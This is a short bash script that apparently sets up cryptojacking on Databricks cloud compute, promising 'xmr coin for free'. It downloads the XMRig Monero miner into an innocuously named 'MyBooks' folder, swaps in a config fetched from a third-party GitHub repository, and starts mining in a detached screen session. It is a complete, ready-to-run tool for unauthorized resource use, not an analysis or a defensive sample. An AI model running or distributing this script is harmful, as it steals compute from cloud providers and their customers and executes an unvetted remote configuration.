#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
sudo apt install screen
clear

cd
mkdir MyBooks
cd MyBooks

#wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
#tar xvzf xmrig-6.16.4-focal-x64.tar.gz
#cd xmrig-6.16.4

wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-bionic-x64.tar.gz
tar xvzf xmrig-6.17.0-bionic-x64.tar.gz
cd xmrig-6.17.0

rm config.json
wget https://raw.githubusercontent.com/KevinWilson62/Cool1/main/Main/config.json

cd ~/MyBooks/xmrig-6.17.0
clear


screen -R xmr
./xmrig
